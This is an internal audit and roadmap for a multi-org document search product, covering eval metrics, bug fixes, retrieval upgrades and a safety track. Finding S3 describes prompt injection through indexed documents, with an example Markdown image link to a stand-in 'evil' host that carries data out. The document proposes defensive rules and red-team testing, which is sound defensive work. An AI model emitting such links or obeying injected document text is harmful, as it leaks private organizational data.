# Strata — Audit findings and roadmap (2026-10-31)

Full detail: **[AUDIT.md](AUDIT.md)** (every code finding with file:line evidence), **[RESEARCH.md](RESEARCH.md)** (research with sources), [API_AUDIT.md](API_AUDIT.md) (API layer) and [EVALUATION.md](EVALUATION.md) (measurements).

Built from four independent reviews:
- a read-only code audit of everything outside the API layer;
- research on retrieval and answer quality;
- research on product features and peer projects;
- research on parsing, evaluation, observability and safety tooling;

plus our own measurements in [EVALUATION.md](EVALUATION.md). Effort: **S** ≈ ≤1 day, **M** ≈ 2–5 days, **L** ≈ 1–3 weeks. Every quality change gets a before/after run with `backend/eval`. Nothing ships on a hunch.

## Where we stand

| | Today |
|---|---|
| Answers (45 questions) | 42–44/45 correct; 100% honest abstention on unanswerable questions |
| Exhaustive lists (60 records) | 34/50 facts at best; it now says when it may be incomplete |
| Speed | ~8 s per answer on Claude Haiku 5.5 (gateway); 20–30 s on Nemotron |
| Retrieval | recall@5 0.94 with reranking |
| Connectors | Upload and Tavily web search verified live; Drive, Slack and Notion only against simulated APIs |
| Not measured at all | faithfulness of individual claims, citation precision, cost per org, p95 latency, injection resistance |

**Strata's opening.** No product we looked at offers permission-aware search across several organizations with org-labelled citations. Microsoft 365 Copilot explicitly can't search tenants where the user is a guest ([source](https://learn.microsoft.com/en-us/training/modules/examine-data-security-microsoft-365-copilot/3-examine-copilot-protects-sensitive-business-data)). Onyx, Glean, Dust and the open-source peers are all one-org-at-a-time. Every compounding feature below should lean into that.

---

## 1. Metrics: what we'll measure from now on

The current harness covers retrieval recall, MRR, per-fact correctness, abstention and latency. It's missing the metrics that catch the failures users actually notice.

| Metric | Why | How | Target |
|---|---|---|---|
| **Claim faithfulness** | An answer can pass "all facts present" and still add an unsupported claim | Split the answer into claims and check each against the retrieved text (DeepEval Faithfulness or an NLI model) | ≥ 0.95 |
| **Citation precision / recall** (ALCE-style) | Today we only check whether the gold *document* was cited somewhere | Per sentence: does the cited passage support it, and is every claim cited? ([ALCE](https://arxiv.org/abs/2305.14627)) | ≥ 0.90 / ≥ 0.85 |
| **List completeness** | Our weakest category | Item recall and precision on aggregate questions, plus "flagged as possibly incomplete" when recall < 1 | recall ≥ 0.95 once structured records ship |
| **Judge reliability** | LLM judges overstate agreement by 33–41 points ([arXiv 2606.19544](https://arxiv.org/abs/2606.19544)) | Hand-label 50 items and report Cohen's κ; use a judge from a different model family; pin judge and prompt versions | κ ≥ 0.7 |
| **Statistical power** | With 45 questions, one question = 2.2 points | Grow to **~150 questions** (more table, xlsx/pptx, multi-hop, cross-org); paired bootstrap for comparisons | detect ±3 pts |
| **Latency p50 / p95**, per stage | 8–30 s is too slow for chat | OpenTelemetry spans for retrieve, rerank, each tool and model turn | p50 < 5 s quick mode |
| **Cost per question, per org** | Gateway credits are real money | Usage from provider responses, tagged with `org_id` | tracked; budget alerts |
| **Attack success rate** | Indexed documents are untrusted input | promptfoo red-team suite: injected documents, exfiltration attempts | < 2%, without lowering the answer pass rate |
| **Ingestion health** | Silent failures today (empty scans, skipped files) | Per-document status, empty-file rate, sync lag | 0 silent failures |
| **Product signals** | What users actually get | Thumbs-up rate, "no answer" rate, follow-up rate, verified-answer reuse | trend up |

**CI:** a 15-question smoke set on every PR with a cheap judge, the full set nightly, cached verdicts, and release gating on a paired bootstrap. Tools: keep our harness, and add [DeepEval](https://github.com/confident-ai/deepeval) metrics (Apache-2.0, active; it has citation-faithfulness and agent-loop metrics) plus [promptfoo](https://github.com/promptfoo/promptfoo) for red-teaming. RAGAS appears to be stalling (last push Feb 2026), so we're not adopting it.

---

## 2. Fix now: verified bugs from the audit (≈1 week)

These are correctness and security bugs in what already exists. All are verified in code, and two were reproduced by me (C1, S1).

| # | Problem | Fix | Effort |
|---|---|---|---|
| **C1** | Search results show the model the passage *before* each hit, then cut to 2,400 characters. With real ~2,000-character passages the model sees the previous passage plus only ~300 characters of the actual hit. The eval missed it because its documents are short. | Build the window around the hit: the hit first and complete, then trailing context. Drop the duplicated overlap. Add a test using long passages. | S |
| **C2** | No hard cap on passage size. Unpunctuated text and JSON produce 10k–152k-character passages that the embedder truncates at about 512 tokens, so the rest can't be found. | Hard word cap; split code, JSON and tables by lines. | S |
| **S1** | **SSRF in the website crawler**: no private-address check, and it follows redirects. Anyone can sign up, create an org and crawl internal URLs. | Reuse the guarded fetcher (public-address check on every hop, manual redirects, byte cap). | S |
| **S3** | Indirect prompt injection, plus **zero-click exfiltration through Markdown images**. A document can make the answer render `![](https://evil/?d=…)`. | Tell the model retrieved and attached content is data, not instructions. Escape attachments. Strip or proxy external images. CSP `img-src 'self'`. | S |
| **S5** | Hidden documents still reach the model through the knowledge graph. | Join documents and add `NOT hidden` in graph queries. | S |
| **I1** | A full sync deletes anything a connector *skipped* after a transient error, taking votes, boosts and graph data with it. | Count skipped or failed items as still present; abort pruning when the error ratio is high. | S |
| **I2** | No job lease: syncs and extractions over 30 minutes get re-queued and run twice at once, doubling LLM spend. | Heartbeat on progress, plus a per-source advisory lock. | M |
| **P2** | Each chat run holds a database connection and an open transaction for its whole run, so a process tops out at about 20 concurrent answers. | Short sessions per tool call. | M |
| **O3 / F1** | A restart leaves answers stuck "streaming", and **Stop doesn't stop the run**: it keeps generating and billing. | Cancel endpoint that cancels the task; reap stale runs at startup. | S |
| **S4** | Connector secrets (GitHub, Slack and Notion tokens, Google keys) are stored in plaintext. | Envelope encryption with a key from the environment or a KMS. | M |
| O5 | The default `SECRET_KEY` is accepted, and the DB port is published with the `postgres` password. | Refuse the default outside dev; don't publish the DB port. | S |
| F2 | No `aria-live` region, so screen readers get nothing from streaming answers. | Add a polite live region. | S |

The full findings, with file:line evidence, are in [AUDIT.md](AUDIT.md).

---

## 3. Quality and speed upgrades (≈2–3 weeks)

Ranked by expected value. Each one is measured before it becomes the default.

1. **Latency bundle (S–M).** Target: 2–3× faster.
   - Prompt caching for the system prompt, tools and conversation prefix. Cache reads cost 0.1× and cut latency on long prompts.
   - Run independent sub-queries concurrently.
   - A **fast path**: simple lookups get one retrieve-and-answer pass with no agent loop.
   - Rerank once against the main query instead of 6 × 40 pairs, or use a 0.5–1B reranker such as mxbai-rerank-base-v2 or Qwen3-Reranker-0.6B (both Apache-2.0).
2. **Contextual Retrieval + real BM25 (S–M).**
   - Prepend a short LLM-written context to each passage before embedding *and* keyword indexing. Anthropic measured top-20 retrieval failures down 49% before reranking and 67% with it ([source](https://www.anthropic.com/news/contextual-retrieval)), at about $1 per million document tokens with caching.
   - Replace `ts_rank` (no IDF; scores every match, which the audit flags as the first thing to break at 1M passages) with **[pg_textsearch](https://github.com/timescale/pg_textsearch)** BM25. It's PostgreSQL-licensed and needs PG 17+, so the Docker image moves from pg16 to pg17.
3. **Embedding upgrade (S).** [granite-embedding-small-english-r2](https://huggingface.co/ibm-granite/granite-embedding-small-english-r2) (Apache-2.0) has the **same 384 dimensions**, so no schema change, only a re-embed. Its card shows much better long-document and table retrieval (LongEmbed 61.9 vs 32.1 for our current model). It loads in fastembed. If multilingual becomes a requirement, use Qwen3-Embedding-0.6B instead.
4. **Parsing with [Docling](https://github.com/docling-project/docling) (M).** MIT-licensed, runs on CPU, and adds **xlsx, pptx, eml/msg, OCR and real table structure**, which fixes "scanned PDF indexes as empty". Tables become their own passages, and later structured rows.
   - Optional heavy path for hard scans: MinerU or olmOCR 2 on a GPU worker through the existing job queue.
   - Avoid Marker's model weights (licensed only for companies under $5M revenue or funding) and pymupdf4llm (AGPL).
   - Measure table *recall*, since parsers silently drop tables.
5. **Citation verification and calibrated abstention (S–M).**
   - Use Claude's Citations API on the Claude path.
   - Check each sentence against its cited passages with a small grounding model (HHEM-2.1-open or Granite Guardian, both Apache-2.0).
   - Flag unknown or unsupported `[n]` instead of silently dropping them (audit C3).
   - Add a "sufficient context" check before answering ([arXiv 2411.06037](https://arxiv.org/abs/2411.06037): +2–10% accuracy among answered questions).
6. **Observability (M).** OpenTelemetry instrumentation exported to self-hosted **[Langfuse](https://github.com/langfuse/langfuse)** (MIT), with `org_id` on every trace, giving cost per org, per-stage latency and the tool-call trace. Phoenix (ELv2) is the lighter alternative if Langfuse's four services are too much. Add Prometheus metrics for queue lag and job failures.

---

## 4. Exact answers and multi-hop (≈3–4 weeks)

This fixes our weakest measured category properly. The benchmarks agree that top-k retrieval can't answer "find all" questions: AI21 reports 5–11% on aggregate questions ([talk](https://ai.engineer/talks/rag-evaluation-is-broken-here-s-why-and-how-to-fix-it)), and AGGBench (2026) found RAG and text-to-SQL both incomplete ([arXiv 2602.01355](https://arxiv.org/abs/2602.01355)). Our LightRAG graph failed for the same reason: free-form extraction is lossy.

1. **Structured records (L), the main fix.**
   - Per-collection record schemas: vendor, contract, person/role, policy, project. Most are auto-suggested from document structure, then confirmed by an admin.
   - Extraction with **[Google LangExtract](https://github.com/google/langextract)** (Apache-2.0). Every field is grounded to character offsets, so every row is citable.
   - Docling tables and `Field: value` lines are parsed deterministically for free; the LLM handles only the rest.
   - Rows land in typed Postgres tables with `org_id`, `collection_id` and access filtering.
   - The agent gets a `query_records` tool with exact filters, COUNT and DISTINCT, so answers become exact and cited.
2. **Exhaustive `scan` tool (M).** For questions no schema covers: take *every* document matching a filter (no top-k), then run a cheap per-document check in parallel, in the style of [LOTUS](https://github.com/lotus-data/lotus) and [DocETL](https://github.com/ucbepic/docetl). Slower, but complete, and it says so.
3. **People, roles and aliases (M).** Tables of people, aliases ("Oluwaseun" = "Seun" = "OA") and role assertions with dates (who is Head of Security, and since when). A `resolve_role` mode in the explorer, plus an explicit "next hop" step in the agent prompt (IRCoT-style). This targets our remaining multi-hop misses (q21, q24).
4. **Graph cleanup.** Keep the LightRAG graph opt-in. If structured records and the people/roles tables deliver, retire it.

---

## 5. Safety track (parallel, ≈1–2 weeks)

Research is clear that defenses inside the model lose to adaptive attacks: 12 defenses, including spotlighting, were bypassed at over 90% ([arXiv 2510.09023](https://arxiv.org/abs/2510.09023)). Enforcement has to live *outside* the model.

1. **Tool-call policy layer.** Web-search queries can't carry retrieved private text (checked); domains for links and images in answers are allowlisted; tools are switched on per org. **Strata's web-search tool is currently a possible exfiltration channel.**
2. **Datamarking** of retrieved passages and attachments (cheap; reduces naive attacks).
3. **Llama Prompt Guard 2 (22M)** flags suspicious documents at ingestion. It detects only 7–37% of indirect injections in third-party tests, so it's a signal for admins, not a security boundary.
4. **[Presidio](https://github.com/data-privacy-stack/presidio)** (MIT) PII tagging at ingestion, with per-org redaction, and scrubbing before traces are exported.
5. A **promptfoo red-team suite** in nightly CI, tracking attack success rate.
6. Secrets encryption (audit S4) and parsing in a resource-limited subprocess (audit S6: decompression bombs).

---

## 6. Compounding features

Ranked by (value × fit) ÷ effort. Each gets more valuable *because* Strata is multi-org, permission-aware and already indexes everything.

| # | Feature | Who else ships it | Why it compounds for Strata | Effort |
|---|---|---|---|---|
| 1 | **MCP server** | Glean, Onyx v5, Guru, AnythingLLM | One permission-aware endpoint that searches *across a user's orgs* with org-labelled citations, usable from Claude, ChatGPT and IDE agents. Mostly wraps existing APIs and keys. | S |
| 2 | **Knowledge-gap detection and doc requests** | Guru, Coveo, Glean Insights | Clusters of unanswered or low-confidence questions per org (data we already log). Unique view: "answered in org B, missing in org A". One click requests the doc from the owning admin. | S–M |
| 3 | **Verified answers (FAQ promotion)** | Glean Answers, Guru | Promote a good answer to a verified answer with an owner and an expiry; it's boosted in retrieval. Reuses boost, hide and votes. Pairs with #2: gap → doc request → verified answer. | S |
| 4 | **Per-org audit log and compliance export** | Credal, Perplexity, Purview | Each org's admin sees every query that touched its data, *including from other orgs*. Needed before clients connect sensitive sources. | M |
| 5 | **Slack / Teams bot** | Glean, Dust, Onyx | Slack is already a connector. Map a workspace or channel to an org scope; a Slack Connect channel shared between companies maps naturally to a multi-org scope. | M |
| 6 | **Digests and watch alerts** | Glean, Copilot, Notion agents, Khoj; Quivr pivoted to this | "What changed across my 6 clients this week" and "tell me when this policy changes". Uses the change detection and worker queue we already have. | M |
| 7 | **Answer permalinks** | Glean, Copilot Notebooks | Permissions are re-checked per viewer, who only sees the citations they're allowed to; a request-access flow covers the rest. | S |
| 8 | **Stale and contradictory content detection** | Guru | Flags outdated or conflicting documents within an org and across orgs (client policy vs consultancy template) using dates and records. Feeds hide and verify. | M |
| 9 | **Shared collections between orgs** | Slack Connect pattern; Copilot can't | Partner-visible collections with expiry, audit trail and revocation. Turns Strata from federated search into a collaboration layer. Touches the access-control model, so it comes after #4. | L |
| 10 | **Matrix extraction** | Hebbia | "The same 8 questions across 30 portfolio decks, grouped by org": a grid of cited answers. Builds on deep mode and structured records. | M–L |

Deprioritised: expert finding (identities don't align across orgs), actions with approvals (large and generic), and browser extension, voice and multilingual UI (little compounding; revisit with demand).

---

## 7. Sequencing

| When | Track A: quality and platform | Track B: product |
|---|---|---|
| Week 1 | §2 bug fixes (C1, C2, S1, S3, S5, I1, O3/F1) | MCP server |
| Weeks 2–3 | Eval to 150 questions + faithfulness and citation metrics + judge κ; OpenTelemetry → Langfuse | Verified answers; permalinks |
| Weeks 3–5 | Latency bundle; Contextual Retrieval + BM25; embedding swap; Docling | Knowledge gaps + doc requests |
| Weeks 5–8 | Structured records + `query_records`; scan tool; people, roles and aliases | Audit log; Slack bot |
| Weeks 8–10 | Safety track complete (policy layer, red-team suite in CI) | Digests and alerts; stale and contradiction detection |
| Later | GPU parsing path; partitioned or quantised vector index at scale | Shared collections between orgs; matrix extraction |

**Gates:** a change ships only when the paired eval shows no regression in any category, and it moves its own metric.

### Considered and not planned
- **Search-R1 / RL-trained agents:** needs our own model training.
- **Full GraphRAG:** loses to plain RAG on simple facts at ~2.3× latency ([GraphRAG-Bench](https://arxiv.org/abs/2506.05690)).
- **ColBERT / SPLADE:** marginal next to our cross-encoder.
- **Semantic / proposition chunking:** not justified on realistic corpora ([Vectara](https://arxiv.org/abs/2410.13070)).
- **Semantic cache:** only once traces show repeated queries, and then keyed by org, permissions and corpus version.
- **Dify:** its licence forbids running it multi-tenant without a commercial licence.
- **Marker weights, pymupdf4llm:** licence terms.
- **RAGAS:** stalling.
- **Helicone:** in maintenance mode.

---

## Appendix: full audit findings

| ID | Sev | Area | Finding |
|---|---|---|---|
| C1 | high | Correctness | Search-result window shows the passage before the hit, then truncates (tools.py, hybrid.py `neighbour_text`) |
| C2 | high | Correctness | Unbounded passage size; 152k-character passages possible (chunker.py) |
| C3 | med | Correctness | Citations not verified; unknown `[n]` silently dropped; graph refs point at documents the model never read |
| C4 | med | Correctness | The document sheet may highlight the wrong passage (one chunk per cited document) |
| C5 | med | Correctness | PDF headings lost per page; DOCX tables moved to the end of the document; CSV split one row per passage |
| C6 | low | Correctness | No prompt rule for superseded versions within one org |
| S1 | high | Security | Crawler SSRF and redirects; unbounded response size |
| S2 | low | Security | DNS-rebinding window in the guarded fetcher |
| S3 | high | Security | Injection and Markdown-image exfiltration; attachments unescaped |
| S4 | med | Security | Plaintext connector secrets |
| S5 | med | Security | Hidden documents leak through graph descriptions |
| S6 | med | Security | Upload name collisions; no quotas; parse bombs run on the event loop |
| S7 | low | Security | Files left on disk after org or collection delete |
| I1 | high | Ingestion | Pruning after skipped items deletes documents and their curation |
| I2 | high | Ingestion | No job lease; long jobs run twice |
| I3 | med | Ingestion | Per-document failures and "empty" results invisible to users |
| I4 | med | Ingestion | Parsing blocks the worker event loop; savepoint held during remote embedding |
| I5 | med | Ingestion | No re-index path after model or parser changes; dimension mismatch fails silently |
| I6 | low | Ingestion | Graph extraction all-or-nothing per document |
| P1 | high | Scale | Keyword leg ORs every word and sorts all matches |
| P2 | high | Scale | Chat runs hold a connection and open transaction throughout |
| P3 | med | Scale | N+1 queries in the graph tools |
| P4 | med | Scale | 6 × 40 rerank pairs per search |
| P5 | med | Scale | One global HNSW index for all tenants |
| P6 | low | Scale | Voyage embeddings: no retry, sequential batches |
| P7 | low | Scale | UI re-parses the whole Markdown answer on every update |
| O1 | med | Ops | Health check doesn't test the DB; no worker health check, metrics or traces |
| O2 | med | Ops | Every API replica runs migrations at start |
| O3 | med | Ops | Answers stuck "streaming" after a restart |
| O4 | med | Ops | No backups for the database and uploaded files |
| O5 | low | Ops | Config footguns (default secret, published DB port, build-time backend URL) |
| F1 | med | UX | Stop doesn't stop the server-side run |
| F2 | med | UX | No `aria-live` region |
| F3 | low | UX | Sources rail hidden below 1280 px |
| F4 | low | UX | Insights skeleton shows forever on error |

**Test gaps:** crawler SSRF; queue leases and retries; pruning after partial failures; chunk caps and the hit window; PDF parsing; hidden documents in the graph; unknown citations; injection regressions; cancel; migrations up and down; no frontend tests at all.
